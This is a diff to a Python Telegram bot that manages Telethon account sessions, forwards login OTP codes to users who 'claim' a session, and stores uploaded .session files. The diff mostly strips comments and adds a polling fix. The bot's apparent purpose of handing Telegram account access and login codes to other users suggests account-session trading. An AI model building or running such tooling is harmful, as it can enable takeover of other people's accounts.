@@ -102,8 +102,8 @@ def is_admin(user_id):
     return user_id in ADMIN_IDS
 
 # ---------- GLOBALS ----------
-clients = {}        # session_name -> Telethon client
-claim_map = {}      # session_name -> user_id (who gets OTP)
+clients = {}
+claim_map = {}
 listener_tasks = {}
 
 # ---------- HELPERS ----------
@@ -121,7 +121,7 @@ async def forward_otp(session_name, otp):
                 parse_mode='Markdown'
             )
             return True
-        except Exception:
+        except:
             pass
     return False
 
@@ -312,9 +312,8 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ Cancelled.")
     return ConversationHandler.END
 
-# ---------- RESEND OTP (COMMAND + CALLBACK) ----------
+# ---------- RESEND OTP ----------
 async def resend_otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/resend_otp command handler"""
     phone = context.user_data.get('phone')
     if not phone:
         await update.message.reply_text("❌ No active session. Use /create first.")
@@ -325,7 +324,6 @@ async def resend_otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text("❌ Session name missing. Use /create again.")
         return
 
-    # Disconnect old client if exists
     if 'client' in context.user_data:
         try:
             await context.user_data['client'].disconnect()
@@ -352,7 +350,6 @@ async def resend_otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         return ConversationHandler.END
 
 async def resend_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Callback for 'Resend OTP' inline button"""
     query = update.callback_query
     await query.answer()
 
@@ -363,7 +360,6 @@ async def resend_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         await query.edit_message_text("❌ No active session. Use /create first.")
         return
 
-    # Disconnect old client
     if 'client' in context.user_data:
         try:
             await context.user_data['client'].disconnect()
@@ -384,7 +380,6 @@ async def resend_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
-        # State remains WAITING_OTP
     except Exception as e:
         await query.edit_message_text(f"❌ Failed to resend OTP: {e}")
 
@@ -504,7 +499,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Download file
     file = await document.get_file()
     save_path = SESSION_DIR / f"{session_name}.session"
     await file.download_to_drive(save_path)
@@ -554,4 +548,5 @@ if __name__ == '__main__':
     print("🤖 Bot starting...")
     print(f"📁 Sessions: {SESSION_DIR.absolute()}")
     print(f"📊 Database: {DB_PATH.absolute()}")
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    # 🔽 FIX: drop_pending_updates=True to avoid conflict
+    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
